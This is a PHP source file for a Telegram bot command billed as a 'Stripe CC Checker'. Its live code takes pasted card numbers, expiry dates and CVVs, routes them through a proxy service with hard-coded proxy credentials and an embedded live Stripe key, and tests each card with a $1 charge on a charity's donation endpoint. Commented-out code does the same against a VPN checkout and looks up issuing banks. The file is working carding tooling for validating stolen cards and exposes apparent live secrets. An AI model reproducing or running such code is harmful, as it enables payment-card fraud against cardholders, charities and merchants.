<?php

/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/


include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";


////////////====[MUTE]====////////////
if(strpos($message, "/ttt ") === 0 || strpos($message, "!ttt ") === 0){   

    $get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
    preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
    $name = $matches1[1][0];
    preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
    $last = $matches1[1][0];
    preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
    $email = $matches1[1][0];
    preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
    $street = $matches1[1][0];
    preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
    $city = $matches1[1][0];
    preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
    $state = $matches1[1][0];
    preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
    $phone = $matches1[1][0];
    preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
    $postcode = $matches1[1][0];
    preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
    $email = $matches1[1][0];

    $antispam = antispamCheck($userId);
    addUser($userId);
    
    if($antispam != False){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id
      ]);
      return;

    }else{
        $messageidtoedit1 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Wait for Result...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id

        ]);

        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 4);
        $bin = substr($cc, 0, 6);
        
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mes = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $ano = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
        
            ##TEST
            $ch = curl_init('');
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_PROXY, 'http://zproxy.lum-superproxy.io:22225');
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'lum-customer-hl_2540495b-zone-static:g6virm38eayq');
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 OPR/65.0.3467.78',
            'Origin: https://checkout.stripe.com',
            'Referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=561f39d7-72cb-0708-1bff-23a6263992f8'
                ));
            curl_setopt($ch, CURLOPT_POSTFIELDS, 
            'email=abhiyanqwe%40gmail.com&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2F551a9ed)&referrer=https%3A%2F%2Fromero.mercycommunity.org.au%2Fdonate%2F&pasted_fields=number&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]=Texa+LOl&card[address_line1]=4283+Express+Lane&card[address_city]=sarasota&card[address_state]=FL&card[address_zip]=34249&card[address_country]=United+States&time_on_page=62202&guid=af14a93b-8b72-436b-8e14-90bb703993ea&muid=a0ab5dc8-564e-467a-8633-b87f2b0334cd&sid=ecad1248-6c38-4ddc-8c56-7046debb5c8a&key=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');

            $c = curl_exec($ch);
            
            $token = trim(strip_tags(capture($c,'id": "','"')));
            echo $token;
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://mercy-stripe.xct01.com/donate.php');
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 OPR/65.0.3467.78',
            'Content-Type: text/plain;charset=UTF-8',
            'Origin: https://romero.mercycommunity.org.au',
            'Referer: https://romero.mercycommunity.org.au/donate/',
            'Connection: keep-alive'
                ));
            curl_setopt($ch, CURLOPT_POSTFIELDS, 
            '{"amount":"1","plan":null,"frequency":"one-off","currency":"aud","email":"texas1123@gmail.com","token":"'.$token.'","description":"Romero Centre - $1 Gift"}');
            $a = curl_exec($ch);
            $message = trim(strip_tags(capture($a,'"message":"','"')));

            $info = curl_getinfo($ch);
            $time = $info['total_time'];
            $time = substr_replace($time, '',4);
            ##
            echo $a;
            echo $message;
            bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>Card:</b> <code>$lista</code>
Response -» '$a.'-'.$message'
<b>----------------------------</b>
<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/RedHoodPRO'>𝓡𝓮𝓭𝓗𝓸𝓸𝓭𝓟𝓡𝓞</a></b>",
'parse_mode'=>'html',
'disable_web_page_preview'=>'true'
                ]);

            ###CHECKER PART###  
            $zip = rand(10001,90045);
            $time = rand(30000,699999);
            $rand = rand(0,99999);
            $pass = rand(0000000000,9999999999);
            $email = substr(md5(mt_rand()), 0, 7);
            $name = substr(md5(mt_rand()), 0, 7);
            $last = substr(md5(mt_rand()), 0, 7);
        
            // $ch = curl_init();
            // curl_setopt($ch, CURLOPT_URL, 'https://m.stripe.com/6');
            // curl_setopt($ch, CURLOPT_PROXY, $url[array_rand($url)]);
            // curl_setopt($ch, CURLOPT_PROXYUSERPWD, $userpass[array_rand($userpass)]);
            // curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            // curl_setopt($ch, CURLOPT_HEADER, 0);
            // curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            // 'Host: m.stripe.com',
            // 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
            // 'Accept: */*',
            // 'Accept-Language: en-US,en;q=0.5',
            // 'Content-Type: text/plain;charset=UTF-8',
            // 'Origin: https://m.stripe.network',
            // 'Referer: https://m.stripe.network/inner.html'));
            // curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            // curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            // curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            // curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            // curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            // curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            // curl_setopt($ch, CURLOPT_POSTFIELDS, "");
            // $res = curl_exec($ch);
            // $muid = trim(strip_tags(capture($res,'"muid":"','"')));
            // $sid = trim(strip_tags(capture($res,'"sid":"','"')));
            // $guid = trim(strip_tags(capture($res,'"guid":"','"')));
            
            // $ch = curl_init();
            // curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
            // curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            // curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            // 'Host: lookup.binlist.net',
            // 'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
            // 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
            // curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            // curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            // curl_setopt($ch, CURLOPT_POSTFIELDS, '');
            // $fim = curl_exec($ch);
            // $bank = capture($fim, '"bank":{"name":"', '"');
            // $cname = capture($fim, '"name":"', '"');
            // $brand = capture($fim, '"brand":"', '"');
            // $country = capture($fim, '"country":{"name":"', '"');
            // $phone = capture($fim, '"phone":"', '"');
            // $scheme = capture($fim, '"scheme":"', '"');
            // $type = capture($fim, '"type":"', '"');
            // $emoji = capture($fim, '"emoji":"', '"');
            // $currency = capture($fim, '"currency":"', '"');
            // $binlenth = strlen($bin);
            // $schemename = ucfirst("$scheme");
            // $typename = ucfirst("$type");
            
            
            /////////////////////==========[Unavailable if empty]==========////////////////
            
            
            if (empty($schemename)) {
            	$schemename = "Unavailable";
            }
            if (empty($typename)) {
            	$typename = "Unavailable";
            }
            if (empty($brand)) {
            	$brand = "Unavailable";
            }
            if (empty($bank)) {
            	$bank = "Unavailable";
            }
            if (empty($cname)) {
            	$cname = "Unavailable";
            }
            if (empty($phone)) {
            	$phone = "Unavailable";
            }
            
            // $ch = curl_init();
            // curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
            // curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            // curl_setopt($ch, CURLOPT_HEADER, 0);
            // curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            //   'Host: api.stripe.com',
            //   'Accept: application/json',
            //   'Accept-Language: en-US,en;q=0.9',
            //   'Content-Type: application/x-www-form-urlencoded',
            //   'Origin: https://js.stripe.com',
            //   'Referer: https://js.stripe.com/',
            //   'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'));
            // curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            // curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            // curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            // curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            // curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            // curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            // curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&billing_details[address][postal_code]=$zip&guid=$guid&muid=$muid&sid=$sid&payment_user_agent=stripe.js%2Fc478317df%3B+stripe-js-v3%2Fc478317df&time_on_page=$time&referrer=https%3A%2F%2Fatlasvpn.com%2F&key=pk_live_woOdxnyIs6qil8ZjnAAzEcyp00kUbImaXf");
            // $result1 = curl_exec($ch);
            
            // if(stripos($result1, 'error')){
            //   $errormessage = trim(strip_tags(capture($result1,'"message": "','"')));
            //   $stripeerror = True;
            // }else{
            //   $id = trim(strip_tags(capture($result1,'"id": "','"')));
            //   $stripeerror = False;
            // }
            
            // if(!$stripeerror){
            //     $ch = curl_init();
            //     curl_setopt($ch, CURLOPT_URL, 'https://user.atlasvpn.com/v1/stripe/pay');
            //     curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            //     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            //     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            //     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            //     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            //     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            //       'Accept: application/json, text/plain, */*',
            //       'Accept-Language: en-US,en;q=0.9',
            //       'content-type: application/json;charset=UTF-8',
            //       'Host: user.atlasvpn.com',
            //       'Origin: https://atlasvpn.com',
            //       'Referer: https://atlasvpn.com/',
            //       'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'));
            //     curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            //     curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
                
            //     curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"'.$email.''.$rand.'@gmail40.com","name":"'.$name.' '.$last.'","payment_method_id":"'.$id.'","identifier":"com.atlasvpn.vpn.subscription.p1m.stripe_regular_2","currency":"USD","postal_code":"'.$zip.'"}');
                
            //     $result2 = curl_exec($ch);
            //     $errormessage = trim(strip_tags(capture($result2,'"code":"','"')));
            // }
            // $info = curl_getinfo($ch);
            // $time = $info['total_time'];
            // $time = substr_replace($time, '',4);

            ###END OF CHECKER PART###
            
            
            // if(strpos($result2, 'client_secret')) {
            //   addTotal();
            //   addUserTotal($userId);
            //   addCVV();
            //   addUserCVV($userId);
            //   addCCN();
            //   addUserCCN($userId);
            //   bot('editMessageText',[
            //     'chat_id'=>$chat_id,
            //     'message_id'=>$messageidtoedit,
            //     'text'=>"<b>Card:</b> <code>$lista</code>
            //     <b>Status -» CVV or CCN ✅
            //     Response -» Approved
            //     Gateway -» Stripe Auth 1
            //     Time -» <b>$time</b><b>s</b>

            //     ------- Bin Info -------</b>
            //     <b>Bank -»</b> $bank
            //     <b>Brand -»</b> $schemename
            //     <b>Type -»</b> $typename
            //     <b>Currency -»</b> $currency
            //     <b>Country -»</b> $cname ($emoji - 💲$currency)
            //     <b>Issuers Contact -»</b> $phone
            //     <b>----------------------------</b>

            //     <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
            //     <b>Bot By: <a href='t.me/RedHoodPRO'>𝓡𝓮𝓭𝓗𝓸𝓸𝓭𝓟𝓡𝓞</a></b>",
            //     'parse_mode'=>'html',
            //     'disable_web_page_preview'=>'true'
                
            // ]);}
            // elseif($result2 == null && !$stripeerror) {
            //   addTotal();
            //   addUserTotal($userId);
            //   bot('editMessageText',[
            //     'chat_id'=>$chat_id,
            //     'message_id'=>$messageidtoedit,
            //     'text'=>"<b>Card:</b> <code>$lista</code>
            //     <b>Status -» API Down ❌
            //     Response -» Unknown
            //     Gateway -» Stripe Auth 1
            //     Time -» <b>$time</b><b>s</b>

            //     ------- Bin Info -------</b>
            //     <b>Bank -»</b> $bank
            //     <b>Brand -»</b> $schemename
            //     <b>Type -»</b> $typename
            //     <b>Currency -»</b> $currency
            //     <b>Country -»</b> $cname ($emoji - 💲$currency)
            //     <b>Issuers Contact -»</b> $phone
            //     <b>----------------------------</b>

            //     <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
            //     <b>Bot By: <a href='t.me/RedHoodPRO'>𝓡𝓮𝓭𝓗𝓸𝓸𝓭𝓟𝓡𝓞</a></b>",
            //     'parse_mode'=>'html',
            //     'disable_web_page_preview'=>'true'
                
            // ]);}
            // else{
            //   addTotal();
            //   addUserTotal($userId);
            //   bot('editMessageText',[
            //     'chat_id'=>$chat_id,
            //     'message_id'=>$messageidtoedit,
            //     'text'=>"<b>Card:</b> <code>$lista</code>
            //     <b>Status -» Dead ❌
            //     Response -» $errormessage
            //     Gateway -» Stripe Auth 1
            //     Time -» <b>$time</b><b>s</b>

            //     ------- Bin Info -------</b>
            //     <b>Bank -»</b> $bank
            //     <b>Brand -»</b> $schemename
            //     <b>Type -»</b> $typename
            //     <b>Currency -»</b> $currency
            //     <b>Country -»</b> $cname ($emoji - 💲$currency)
            //     <b>Issuers Contact -»</b> $phone
            //     <b>----------------------------</b>

            //     <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
            //     <b>Bot By: <a href='t.me/RedHoodPRO'>𝓡𝓮𝓭𝓗𝓸𝓸𝓭𝓟𝓡𝓞</a></b>",
            //     'parse_mode'=>'html',
            //     'disable_web_page_preview'=>'true'
                
            // ]);}
          
        }else{
        //   bot('editMessageText',[
        //       'chat_id'=>$chat_id,
        //       'message_id'=>$messageidtoedit,
        //       'text'=>"<b>Cool! Fucking provide a CC to Check!!</b>",
        //       'parse_mode'=>'html',
        //       'disable_web_page_preview'=>'true'
              
        //   ]);
      }
    }
}
?>